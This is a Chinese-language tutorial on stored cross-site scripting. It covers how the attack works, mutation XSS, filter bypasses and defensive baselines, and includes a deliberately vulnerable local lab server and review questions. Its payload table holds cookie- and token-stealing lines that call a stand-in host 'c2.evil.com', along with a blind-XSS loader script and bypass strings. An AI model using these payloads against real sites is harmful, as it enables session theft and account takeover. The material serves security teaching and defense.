# R14.2 儲存型跨站腳本攻擊機制與防禦分析 (Stored Cross-Site Scripting)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**儲存型跨站腳本 (Stored XSS / Persistent XSS)** 是瀏覽器代碼注入中殺傷力最強的類別。其本質為：**「惡意載荷被寫入後端儲存層（DB、快取、檔案、日誌），日後任何使用者（尤其是高權限管理員）瀏覽受影響頁面時，伺服器直接將未跳脫資料拼裝至 HTML，觸發受害者瀏覽器解析執行」**。

```
[攻擊者] ── 1. 提交 Payload ──► [Web API] ── 2. INSERT ──► [資料庫 (DB)]
                                                               │
                                                               ▼ 3. 管理員瀏覽後台
[管理員瀏覽器] ◄── 5. 觸發執行 ── [管理後台] ◄── 4. SELECT ───┘
      │
      ├── 竊取 Session Cookie / JWT 憑證
      └── 以管理員權限發送 CSRF 請求（新增後門帳號）
```

### 核心作戰決策與邊界
- **攻擊特性**：一對多被動感染、免釣魚 URL、支援非同步盲打（Blind XSS）。
- **目標場景**：留言板、個人簡介、工單回報、富文字文章、日誌審核看板（如 User-Agent 注入）。
- **技術邊界**：
  - **與反射型 (R14.1) 差異**：Payload 已落地儲存，訪客存取正規網址即觸發。
  - **與 DOM 型 (R14.3) 差異**：Payload 由伺服器直接渲染在 HTML 回應中（非純前端取出 JSON 後寫入 DOM）。

---

## 🔬 第一動：底層機制與突變解析 (Vulnerability Mechanics & mXSS)

### 1. 雙階非同步攻擊模型 (Two-Stage Lifecycle)
- **階段一：污染寫入 (Taint Ingestion)**：攻擊者發送常規請求（如 `POST /tickets`），Payload 沉積至 DB。
- **階段二：休眠等待 (Dormant State)**：Payload 在儲存層靜態沉睡，不具威脅。
- **階段三：非同步觸發 (Trigger & Escalation)**：特權用戶載入頁面，後端未編碼輸出，瀏覽器執行惡意代碼。

### 2. 突變型 XSS (Mutation XSS / mXSS) 原理
當系統使用過濾庫清理 HTML 時，瀏覽器在解析與重新序列化過程，可能因 **HTML5 與 MathML/SVG 命名空間切換** 產生語意突變：
1. **過濾階段**：Sanitizer 將標籤判定在 `<math>` 命名空間中，視為純文字註解而放行。
2. **渲染階段**：瀏覽器 HTML 解析器遇到非法標籤觸發容錯機制（Foster Parenting），將標籤強制移出 `<math>`。
3. **突變執行**：原先被隱藏在註解內的屬性被移至外層常規 HTML，突變為可執行標籤（如 `<img onerror=...>`）。

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心注入向量速查表

| 向量類別 | 典型 Payload | 適用場景與特點 |
| :--- | :--- | :--- |
| **自動觸發事件** | `<svg/onload=fetch('//c2.evil.com/?c='+encodeURIComponent(document.cookie))>` | 無須用戶點擊，解析 DOM 立即執行 |
| **圖片錯誤事件** | `<img src=x onerror="this.onerror=null;eval(atob('YWxlcnQoMSk='))">` | 最常見、相容性最高 |
| **偽協定利用** | `<a href="javascript:alert(document.domain)">Click</a>` | 富文字編輯器允許 `<a>` 標籤的場景 |
| **焦點自動搶佔** | `<input autofocus onfocus="fetch('//c2.evil.com/?k='+localStorage.token)">` | 繞過特定標籤過濾 |
| **盲打 (Blind XSS)** | `"><script src="https://xss.report/c/attacker"></script>` | 注入工單、日誌等內部後台查看之端點 |

## 🥷 第三動：防禦規避與過濾繞過 (Evasion & Filter Bypassing)

- **正則遞迴替換缺陷**：
  - 伺服器將 `<script>` 替換為空：使用雙寫標籤 `<scr<script>ipt>alert(1)</script>` 繞過。
- **無空格分隔符**：
  - 使用斜線或 Tab 替代空格：`<svg/onload=alert(1)>`、`<img\x09src=x\x09onerror=alert(1)>`。
- **字元集與編碼混淆**：
  - 利用 Base64 解碼執行：`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`。
- **DOM Clobbering 破壞過濾邏輯**：
  - 注入 `<form id="attributes">` 覆寫 DOM 屬性，導致 Sanitizer 在檢查屬性時拋出例外或略過檢查。

## 🛡️ 第五動：安全架構加固與修復基線 (Hardening & Baseline)

### 1. 輸出端上下文感知轉義 (Jinja2 / Python 範例)
```python
import html

# 核心原則：儲存層保持原樣，輸出至 HTML Body 時強制實體編碼
def render_safe_text(stored_comment: str) -> str:
    return html.escape(stored_comment, quote=True)
```

### 2. 富文字業務：DOMPurify 嚴格白名單基線
```javascript
// 僅允許純文字格式標籤，嚴格禁用事件與協定
const clean = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'li'],
    ALLOWED_ATTR: ['class'],
    FORBID_TAGS: ['script', 'style', 'iframe', 'svg', 'math', 'base'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'href', 'src']
});
```

### 3. 縱深防禦：憑證隔離與 CSP 政策
```http
Set-Cookie: session=xyz123; Path=/; Secure; HttpOnly; SameSite=Strict
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; connect-src 'self';
```

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場核心代碼 (`stored_xss_lab.py`，極簡 20 行)
```python
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import html

DB = []

class StoredHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        len_ = int(self.headers.get('Content-Length', 0))
        DB.append(parse_qs(self.rfile.read(len_).decode()).get('c', [''])[0])
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        safe = "safe=1" in self.path
        items = "".join(f"<li>{html.escape(c, quote=True) if safe else c}</li>" for c in DB)
        self.wfile.write(f"<form method=POST><input name=c><button>Send</button></form><ul>{items}</ul>".encode())

ThreadingHTTPServer(("127.0.0.1", 8142), StoredHandler).serve_forever()
```

### 2. 三步驗證流程

1. **寫入惡意 Payload**：
   ```bash
   curl -s -X POST "http://127.0.0.1:8142/" -d "c=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E"
   ```
2. **檢視渲染端點（確認漏洞）**：
   ```bash
   curl -s "http://127.0.0.1:8142/"
   # 回顯未跳脫內容: <li><img src=x onerror=alert(document.domain)></li>
   ```
3. **驗證加固端點（確認防護生效）**：
   ```bash
   curl -s "http://127.0.0.1:8142/?safe=1"
   # 回顯已轉義實體: <li>&lt;img src=x onerror=alert(document.domain)&gt;</li>
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 儲存型 XSS 與反射型 XSS 在傳播擴散性上有何本質差異？**  
  *分析思路*：
  - 反射型需透過釣魚連結一對一誘騙點擊；儲存型是一對多被動感染。
  - 儲存型載荷落地資料庫後，所有正常瀏覽目標頁面的用戶皆自動觸發，且具備製作 XSS 蠕蟲的潛力。

- [ ] **Q2. 何謂「盲打 XSS (Blind XSS)」？紅隊如何確認攻擊成功？**  
  *分析思路*：
  - 注入點（如工單系統、User-Agent 日誌）前台不回顯，僅在內部管理後台展示。
  - 需依賴帶外通道（Out-of-Band / OOB），透過載入遠端腳本將後台 IP、DOM 樹與 Token 回傳至 C2。

- [ ] **Q3. 為何在寫入資料庫時直接進行 HTML Entity 編碼是錯誤的工程實踐？**  
  *分析思路*：
  - 污染原始資料純度，導致非 Web 終端（App、PDF、SMS）解析出現亂碼符號。
  - 可能引發二次編碼或雙重解碼安全漏洞；最佳實踐永遠是「儲存原始資料，輸出時依上下文編碼」。

- [ ] **Q4. 突變型 XSS (mXSS) 發生的核心機制為何？**  
  *分析思路*：
  - 瀏覽器在處理 HTML 與 SVG/MathML 混合標籤時存在解析歧異。
  - 淨化工具在特定命名空間判定安全放行，但瀏覽器重新渲染時觸發語法糾錯，將載荷拋出至常規 HTML 上下文導致代碼執行。

- [ ] **Q5. 富文字編輯器防範 XSS 的四大防禦基線為何？**  
  *分析思路*：
  - 使用成熟 Sanitizer（如 DOMPurify），嚴格禁用自研正則。
  - 採用標籤白名單（僅保留 `p`, `b`, `i` 等展示標籤）與屬性白名單（封殺 `on*`, `id`, `style`）。
  - 對 `href` 與 `src` 嚴格校驗 `http://` / `https://` 協定，徹底封鎖 `javascript:`。
  - 縱深防禦：部署嚴格 CSP 與標記核心 Cookie 為 `HttpOnly`。
